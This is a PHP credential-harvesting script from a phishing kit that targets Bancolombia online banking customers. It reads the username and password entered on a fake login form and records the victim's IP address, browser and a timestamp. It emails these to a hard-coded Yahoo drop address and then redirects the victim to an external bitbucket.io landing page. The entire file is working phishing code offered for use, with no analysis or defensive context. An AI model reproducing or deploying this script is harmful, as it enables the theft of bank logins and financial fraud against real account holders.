<?php 
$ip = getenv("REMOTE_ADDR"); 
$datamasii=date("D M d, Y g:i a"); 
$e = $_REQUEST['username'] ;
$p = $_REQUEST['password'] ;
$returnBox ='vitocorleon419@yahoo.com'; // return box



$mesaj = "------------Bancolombia--------------

------------------------
Username : $e
Password : $p
IP:$ip
----------------------------------------------------
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."
DATE : $datamasii"; 
$subject = "Bancolombia User";
mail($returnBox, $subject, $mesaj);

header("Location: https://validation77.bitbucket.io/rcb_landing.html");
?>




